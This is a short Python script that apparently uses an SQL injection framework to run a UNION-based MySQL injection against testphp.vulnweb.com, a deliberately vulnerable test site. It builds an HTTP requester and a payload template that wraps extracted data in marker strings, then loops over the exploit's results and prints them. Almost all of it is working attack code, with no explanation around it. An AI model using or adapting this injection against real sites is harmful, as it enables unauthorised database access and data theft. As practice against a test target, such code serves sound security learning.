from alert1 import *
from urllib import quote
import re

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def extract_results(headers, body, time):
  return re.findall(':ABC:(.+?):ABC:', body, re.S)

def mysql_union():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://testphp.vulnweb.com/artists.php?artist=${injection}',
      method = 'GET',
      response_processor = extract_results,
      encode_payload = quote,
      )

  template = '-1 union all select null,null,concat(0x3a4142433a,X,0x3a4142433a) from ${query}-- '

  return Method_union(make_requester, template)

sqli = MySQL_Inband(mysql_union())

for r in sqli.exploit():
  print r
